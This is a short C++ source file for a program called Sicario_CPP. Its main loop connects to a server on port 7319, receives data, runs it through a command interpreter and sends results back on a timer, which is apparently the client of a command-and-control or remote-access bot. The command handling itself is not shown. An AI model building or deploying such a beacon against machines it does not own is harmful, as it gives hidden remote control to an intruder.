#include <iostream>
#include <string>
#include <stdlib.h>
#include <stdio.h>

#ifdef __unix__
    #include <unistd.h>
#endif

#include "sicarioClient.h"


// Warning: Platform-specific!
void sleepFor(unsigned long long seconds) {
    sleep(seconds);
}

const std::string msg_copyright = "Sicario_CPP // 2018 // Made by Erusima and Dante383\n\n";

int main(int argc, char** argv) {
    std::cout << msg_copyright;
    SicarioClient client(argv[1], 7319);
    client.registerUser();
    client.disconnect();
    while(true) {
        sleepFor(client.connInterval);
        client.reconnect();
        client.loginUser(client.userKey);
        std::string data = client.receiveData();
        if(data != "") {
            std::string result = client.interpretCommand(data);
            client.sendData(result);
        }
        client.disconnect();
    }
}

